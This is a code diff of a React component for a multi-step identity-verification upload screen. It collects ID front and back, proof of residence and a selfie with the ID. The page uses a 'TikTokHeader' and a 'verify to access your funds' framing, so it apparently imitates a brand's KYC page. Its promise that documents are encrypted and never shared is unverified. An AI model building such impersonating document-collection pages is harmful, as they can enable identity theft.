@@ -1,7 +1,6 @@
 import { useState } from "react";
 import { Button } from "@/components/ui/button";
-import { Upload, CheckCircle, ShieldCheck, Camera } from "lucide-react";
-import { Progress } from "@/components/ui/progress";
+import { Upload, CheckCircle, ShieldCheck, Camera, ChevronLeft, FileText, Home, User } from "lucide-react";
 import TikTokHeader from "./TikTokHeader";
 
 interface DocumentUploadScreenProps {
@@ -11,20 +10,23 @@ interface DocumentUploadScreenProps {
 
 interface UploadField {
   label: string;
+  shortLabel: string;
   description: string;
   key: string;
+  icon: typeof Upload;
 }
 
 const fields: UploadField[] = [
-  { label: "Identity Document (Front)", description: "Upload the front of your ID, passport, or driver's license", key: "id_front" },
-  { label: "Identity Document (Back)", description: "Upload the back of your identity document", key: "id_back" },
-  { label: "Proof of Residence", description: "Utility bill or bank statement (last 3 months)", key: "residence" },
-  { label: "Selfie with Document", description: "Take a selfie holding your identity document", key: "selfie" },
+  { label: "Identity Document (Front)", shortLabel: "ID Front", description: "Upload the front of your ID, passport, or driver's license", key: "id_front", icon: FileText },
+  { label: "Identity Document (Back)", shortLabel: "ID Back", description: "Upload the back of your identity document", key: "id_back", icon: FileText },
+  { label: "Proof of Residence", shortLabel: "Residence", description: "Utility bill or bank statement (last 3 months)", key: "residence", icon: Home },
+  { label: "Selfie with Document", shortLabel: "Selfie", description: "Take a selfie holding your identity document", key: "selfie", icon: User },
 ];
 
 const DocumentUploadScreen = ({ userName, onSubmit }: DocumentUploadScreenProps) => {
   const [files, setFiles] = useState<Record<string, File | null>>({});
   const [submitting, setSubmitting] = useState(false);
+  const [currentStep, setCurrentStep] = useState(0);
 
   const handleFile = (key: string, file: File | null) => {
     setFiles((prev) => ({ ...prev, [key]: file }));
@@ -33,11 +35,22 @@ const DocumentUploadScreen = ({ userName, onSubmit }: DocumentUploadScreenProps)
   const uploadedCount = fields.filter((f) => files[f.key]).length;
   const allUploaded = uploadedCount === fields.length;
   const progressPercent = (uploadedCount / fields.length) * 100;
+  const field = fields[currentStep];
+  const uploaded = !!files[field.key];
+  const isLastStep = currentStep === fields.length - 1;
 
-  const handleSubmit = async () => {
-    setSubmitting(true);
-    await onSubmit();
-    setSubmitting(false);
+  const handleNext = () => {
+    if (!uploaded) return;
+    if (isLastStep) {
+      setSubmitting(true);
+      onSubmit();
+    } else {
+      setCurrentStep((prev) => prev + 1);
+    }
+  };
+
+  const handleBack = () => {
+    if (currentStep > 0) setCurrentStep((prev) => prev - 1);
   };
 
   return (
@@ -49,92 +62,146 @@ const DocumentUploadScreen = ({ userName, onSubmit }: DocumentUploadScreenProps)
           Welcome back, <strong className="text-foreground">{userName}!</strong>
         </p>
 
-        {/* Step indicator */}
         <div className="mt-4 mb-2 flex items-center justify-between">
           <h2 className="text-xl font-semibold">Verify your identity</h2>
           <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
             Step 2 of 4
           </span>
         </div>
-        <p className="text-sm text-muted-foreground mb-4">
-          Upload the required documents to verify your account and access your funds.
-        </p>
-
-        {/* Security notice */}
-        <div className="flex items-center gap-2 p-3 rounded-xl bg-success/5 border border-success/20 mb-5">
-          <ShieldCheck className="w-4 h-4 text-success shrink-0" />
-          <p className="text-xs text-muted-foreground">Your data is <strong className="text-foreground">encrypted</strong> and securely stored. We never share your documents.</p>
-        </div>
 
         {/* Progress bar */}
-        <div className="mb-6">
+        <div className="mb-5">
           <div className="flex justify-between text-xs text-muted-foreground mb-1.5">
             <span>{uploadedCount} of {fields.length} uploaded</span>
             <span>{Math.round(progressPercent)}%</span>
           </div>
-          <Progress value={progressPercent} className="h-2" />
+          <div className="relative h-2 bg-secondary rounded-full overflow-hidden">
+            <div
+              className="absolute top-0 left-0 h-full bg-success rounded-full transition-all duration-500 ease-out"
+              style={{ width: `${progressPercent}%` }}
+            />
+          </div>
         </div>
 
-        <div className="space-y-3">
-          {fields.map((field) => {
-            const uploaded = !!files[field.key];
+        {/* Step dots */}
+        <div className="flex items-center justify-center gap-2 mb-6">
+          {fields.map((f, i) => {
+            const isDone = !!files[f.key];
+            const isActive = i === currentStep;
             return (
-              <label
-                key={field.key}
-                className={`flex items-center gap-4 p-4 rounded-xl border cursor-pointer transition-all duration-200 ${
-                  uploaded
-                    ? "border-success/40 bg-success/5 shadow-sm"
-                    : "border-border bg-card hover:border-foreground/30 hover:shadow-sm hover:bg-secondary/50"
+              <button
+                key={f.key}
+                onClick={() => setCurrentStep(i)}
+                className={`transition-all duration-300 ${
+                  isActive
+                    ? "w-8 h-2 rounded-full bg-foreground"
+                    : isDone
+                    ? "w-2 h-2 rounded-full bg-success"
+                    : "w-2 h-2 rounded-full bg-border"
                 }`}
-              >
-                <div className={`flex items-center justify-center w-10 h-10 rounded-full shrink-0 ${
-                  uploaded ? "bg-success/10" : "bg-secondary"
-                }`}>
-                {uploaded ? (
-                    <CheckCircle className="w-5 h-5 text-success" />
-                  ) : field.key === "selfie" ? (
-                    <Camera className="w-4 h-4 text-muted-foreground" />
-                  ) : (
-                    <Upload className="w-4 h-4 text-muted-foreground" />
-                  )}
-                </div>
-                <div className="flex-1 min-w-0">
-                  <p className="text-sm font-semibold">{field.label}</p>
-                  <p className="text-xs text-muted-foreground">{field.description}</p>
-                  {!files[field.key] && (
-                    <p className="text-[10px] text-muted-foreground/60 mt-0.5">JPG, PNG or PDF · Max 10MB</p>
-                  )}
-                  {files[field.key] && (
-                    <p className="text-xs text-success mt-1 font-medium truncate">
-                      ✓ {files[field.key]!.name}
-                    </p>
-                  )}
-                </div>
-                <input
-                  type="file"
-                  accept="image/*,.pdf"
-                  className="hidden"
-                  onChange={(e) => handleFile(field.key, e.target.files?.[0] || null)}
-                />
-              </label>
+                aria-label={f.shortLabel}
+              />
             );
           })}
         </div>
 
-        <Button
-          onClick={handleSubmit}
-          disabled={!allUploaded || submitting}
-          className="w-full h-14 rounded-full text-base font-semibold mt-8"
-        >
-          {submitting ? (
-            <span className="flex items-center gap-2">
-              <span className="w-4 h-4 border-2 border-primary-foreground/40 border-t-primary-foreground rounded-full animate-spin" />
-              Submitting...
-            </span>
-          ) : (
-            "Submit Documents"
+        {/* Current document card */}
+        <div key={field.key} className="animate-fade-in">
+          <div className="flex items-center gap-3 mb-4">
+            <div className="flex items-center justify-center w-12 h-12 rounded-xl bg-secondary shrink-0">
+              {uploaded ? (
+                <CheckCircle className="w-6 h-6 text-success" />
+              ) : (
+                <field.icon className="w-5 h-5 text-muted-foreground" />
+              )}
+            </div>
+            <div>
+              <p className="text-sm font-semibold">
+                Document {currentStep + 1} of {fields.length}
+              </p>
+              <p className="text-xs text-muted-foreground">{field.shortLabel}</p>
+            </div>
+          </div>
+
+          <h3 className="text-lg font-semibold mb-1">{field.label}</h3>
+          <p className="text-sm text-muted-foreground mb-5">{field.description}</p>
+
+          {/* Upload area */}
+          <label
+            className={`flex flex-col items-center justify-center gap-3 p-8 rounded-2xl border-2 border-dashed cursor-pointer transition-all duration-300 ${
+              uploaded
+                ? "border-success/40 bg-success/5"
+                : "border-border bg-card hover:border-foreground/30 hover:bg-secondary/50"
+            }`}
+          >
+            <div className={`flex items-center justify-center w-16 h-16 rounded-full transition-all ${
+              uploaded ? "bg-success/10" : "bg-secondary"
+            }`}>
+              {uploaded ? (
+                <CheckCircle className="w-8 h-8 text-success" />
+              ) : field.key === "selfie" ? (
+                <Camera className="w-7 h-7 text-muted-foreground" />
+              ) : (
+                <Upload className="w-7 h-7 text-muted-foreground" />
+              )}
+            </div>
+            {uploaded ? (
+              <div className="text-center">
+                <p className="text-sm font-semibold text-success">{files[field.key]!.name}</p>
+                <p className="text-xs text-muted-foreground mt-1">Tap to replace</p>
+              </div>
+            ) : (
+              <div className="text-center">
+                <p className="text-sm font-semibold">Tap to upload</p>
+                <p className="text-xs text-muted-foreground mt-1">JPG, PNG or PDF · Max 10MB</p>
+              </div>
+            )}
+            <input
+              type="file"
+              accept="image/*,.pdf"
+              className="hidden"
+              onChange={(e) => handleFile(field.key, e.target.files?.[0] || null)}
+            />
+          </label>
+        </div>
+
+        {/* Security notice */}
+        <div className="flex items-center gap-2 p-3 rounded-xl bg-success/5 border border-success/20 mt-5 mb-5">
+          <ShieldCheck className="w-4 h-4 text-success shrink-0" />
+          <p className="text-xs text-muted-foreground">
+            Your data is <strong className="text-foreground">encrypted</strong> and securely stored. We never share your documents.
+          </p>
+        </div>
+
+        {/* Navigation buttons */}
+        <div className="flex gap-3">
+          {currentStep > 0 && (
+            <Button
+              variant="ghost"
+              onClick={handleBack}
+              className="h-14 rounded-full px-6 text-sm font-semibold text-muted-foreground"
+            >
+              <ChevronLeft className="w-4 h-4 mr-1" />
+              Back
+            </Button>
           )}
-        </Button>
+          <Button
+            onClick={handleNext}
+            disabled={!uploaded || submitting}
+            className="flex-1 h-14 rounded-full text-base font-semibold"
+          >
+            {submitting ? (
+              <span className="flex items-center gap-2">
+                <span className="w-4 h-4 border-2 border-primary-foreground/40 border-t-primary-foreground rounded-full animate-spin" />
+                Submitting...
+              </span>
+            ) : isLastStep ? (
+              "Submit Documents"
+            ) : (
+              "Continue"
+            )}
+          </Button>
+        </div>
       </div>
     </div>
   );
